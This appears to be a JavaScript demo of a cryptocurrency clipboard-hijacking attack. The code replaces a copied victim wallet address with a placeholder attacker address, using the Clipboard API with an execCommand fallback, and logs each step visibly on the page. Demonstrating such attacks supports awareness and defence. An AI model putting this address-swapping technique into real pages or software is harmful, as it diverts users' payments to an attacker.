const victimAddress = "1FAKEyBoTx3zzQ8ZfKoin3EV1XoYSmUhkL";
const attackerAddress = "1ATTACKx7oP3KzXQ3HackMePlz0nlyLOL";

function copyAddress() {
  // Modern clipboard API
  if (navigator.clipboard) {
    navigator.clipboard.writeText(attackerAddress)
      .then(() => {
        log("🚨 Clipboard hijacked!");
        log(`🧍 Victim copied: ${victimAddress}`);
        log(`💀 Replaced with: ${attackerAddress}`);
      })
      .catch(err => {
        log(`Clipboard error: ${err}`);
        fallbackCopy();
      });
  } else {
    fallbackCopy();
  }
}

function fallbackCopy() {
  const tempInput = document.createElement("input");
  tempInput.value = attackerAddress;
  document.body.appendChild(tempInput);
  tempInput.select();
  try {
    document.execCommand("copy");
    log("⚠️ Fallback clipboard method used.");
    log(`💀 Copied attacker address: ${attackerAddress}`);
  } catch (err) {
    log("❌ Clipboard copy failed.");
  }
  document.body.removeChild(tempInput);
}

function log(message) {
  const logEl = document.getElementById("log");
  const time = new Date().toLocaleTimeString();
  logEl.innerHTML += `[${time}] ${message}<br>`;
}

// Trigger intro typewriter after DOM loads
window.addEventListener("DOMContentLoaded", () => {
  const introEl = document.querySelector(".typewriter-text");
  if (introEl) {
    introEl.style.display = "inline-block";
  }
});
